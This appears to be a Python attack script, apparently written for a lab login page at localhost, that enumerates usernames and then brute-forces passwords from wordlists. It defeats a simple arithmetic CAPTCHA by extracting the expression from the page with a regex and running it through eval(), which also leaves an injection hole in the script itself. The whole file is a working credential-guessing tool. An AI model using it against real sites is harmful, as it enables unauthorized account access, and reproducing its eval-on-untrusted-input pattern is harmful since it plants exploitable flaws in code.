#!/usr/bin/python3
import requests
import re


def find_username(url, text_failed, filename):
    try:
        users_file = open(filename, 'r')
    except FileNotFoundError:
        print("File not Found")
        return False

    users_list = []

    for user in users_file.readlines():
        users_list.append(user.strip())

    response_request = requests.get(url)
    session = response_request.cookies

    for user in users_list:
        pattern = "([0-9]+\s(\+|\-|\*){1}\s[0-9]+\s=\s\?)"

        captcha_filter = re.search(pattern, str(response_request.content))

        if captcha_filter == None:
            new_post_data = {
                'username': user,
                'password': '1234',
            }
        else:
            captcha_result = eval(captcha_filter.group(0).split('=')[0].strip())
            new_post_data = {
                'username': user,
                'password': '1234',
                'captcha': str(captcha_result)
            }

        response_request = requests.post(url, new_post_data, cookies=session)

        if text_failed not in str(response_request.content):
            print(f"User Located: {user}")
            return user
    
    return False


def find_password(url, user, text_failed, filename):
    try:
        password_file = open(filename, 'r')
    except FileNotFoundError:
        print("File not Found")
        return False

    password_list = []

    for password in password_file.readlines():
        password_list.append(password.strip())

    response_request = requests.get(url)
    session = response_request.cookies

    for password in password_list:
        pattern = "([0-9]+\s(\+|\-|\*){1}\s[0-9]+\s=\s\?)"

        captcha_filter = re.search(pattern, str(response_request.content))

        if captcha_filter == None:
            new_post_data = {
                'username': user,
                'password': password,
            }
        else:
            captcha_result = eval(captcha_filter.group(0).split('=')[0].strip())
            new_post_data = {
                'username': user,
                'password': password,
                'captcha': str(captcha_result)
            }

        response_request = requests.post(url, new_post_data, cookies=session)

        if text_failed not in str(response_request.content):
            print(f"Password Located: {password}")
            return password
        
    return False


url = 'http://localhost/'
user_text_failed = "Invalid username"
password_text_failed = "Invalid password"

user = find_username(url, user_text_failed, '../wordlists/usernames.txt')

if user is not False:
    password = find_password(url, user, password_text_failed, '../wordlists/passwords.txt')

if user is not False and password is not False:
    print(f"User: {user} - Password: {password}")
else:
    print("User or password not found")